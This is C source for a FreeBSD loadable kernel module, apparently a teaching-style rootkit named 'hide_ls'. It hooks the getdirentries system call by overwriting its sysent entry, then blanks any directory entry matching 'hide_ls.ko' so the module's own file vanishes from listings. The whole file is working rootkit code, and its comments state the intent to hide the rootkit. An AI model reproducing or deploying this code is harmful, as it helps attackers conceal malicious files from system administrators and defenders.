#include <sys/types.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/syscall.h>
#include <sys/sysent.h>
#include <sys/sysproto.h>
#include <sys/uio.h>
#include <sys/malloc.h>
#include <sys/errno.h>
#include <sys/syslog.h>
#include <sys/libkern.h>
#include <sys/dirent.h>

#define ROOTKIT_NAME "hide_ls.ko"
#define DEBUG_TAG "[hide_ls]: "

MALLOC_DEFINE(t1, "dirent", "store dirent structures");

static int getdirent_hook(struct thread *td, void *args)
{
    struct getdirentries_args *g_args = (struct getdirentries_args *) args;
    int error = 0;

    // error is actually the # of bytes read
    error = sys_getdirentries(td, args);
    log(LOG_DEBUG, "%s Error: %d\n", DEBUG_TAG, error);

    if (error != -1){
        log(LOG_DEBUG, "%s Found some directory entries!\n", DEBUG_TAG);

        // copy the contents of the buf into kernel memory
        int n = g_args->count;
        char *ptr = malloc(n, t1, M_ZERO);
        if (ptr != NULL){
            log(LOG_DEBUG, "%s Allocated memory at: %p.\n", DEBUG_TAG, ptr);

            // we want to operate on a local copy
            // of the contents of g_args->buf
            if (copyin(g_args->buf, ptr, n) == 0){
                log(LOG_DEBUG, "%s Successfully copied %d bytes to the kernel!\n", DEBUG_TAG, n);
                log(LOG_DEBUG, "Sizeof(dirent) = %d\n", sizeof(struct dirent));

                struct dirent *d_ptr = NULL;
                int i = 0;

                // loop through all the dirent entries
                while (i < n){
                    d_ptr = (struct dirent *) (ptr + i);

                    // reclen = 0 means we are at the end of the list
                    if (d_ptr->d_reclen == 0){
                        break;
                    }

                    // need to hide our rootkit!
                    if (strncmp(d_ptr->d_name, ROOTKIT_NAME, strlen(ROOTKIT_NAME)) == 0){
                        bzero(d_ptr->d_name, d_ptr->d_namlen);
                        d_ptr->d_namlen = 0;
                        d_ptr->d_fileno = 0;
                        d_ptr->d_type   = DT_UNKNOWN;
                        d_ptr->d_reclen = 8;
                    }

                    log(LOG_DEBUG, "%s Filename: %s\n", DEBUG_TAG, d_ptr->d_name);
                    i += d_ptr->d_reclen;
                }

                // copy back to user space
                copyout(ptr, g_args->buf, n);
            }

            else{
                log(LOG_DEBUG, "%s Failed to copyin directory data.\n", DEBUG_TAG);
            }
        }

        else{
            log(LOG_DEBUG, "%s Failed to allocate memory.\n", DEBUG_TAG);
        }

        free(ptr, t1);
    }

    return error;
}

static int load_handler(struct module *module, int cmd, void *arg)
{
    int error = 0;

    switch (cmd){
        case MOD_LOAD:
            log(LOG_DEBUG, "Hooking getdirentries(). ");
            sysent[SYS_getdirentries].sy_call = (sy_call_t *) getdirent_hook;
            break;
        case MOD_UNLOAD:
            log(LOG_DEBUG, "Unhooking getdirentries(). ");
            sysent[SYS_getdirentries].sy_call = (sy_call_t *) sys_getdirentries;
            break;
        default:
            error = EOPNOTSUPP;
            break;
    }

    return error;
}

static moduledata_t rk_mod = {
    "hide_ls",   // module name
    load_handler,   // load function
    NULL
};

DECLARE_MODULE(hide_ls, rk_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
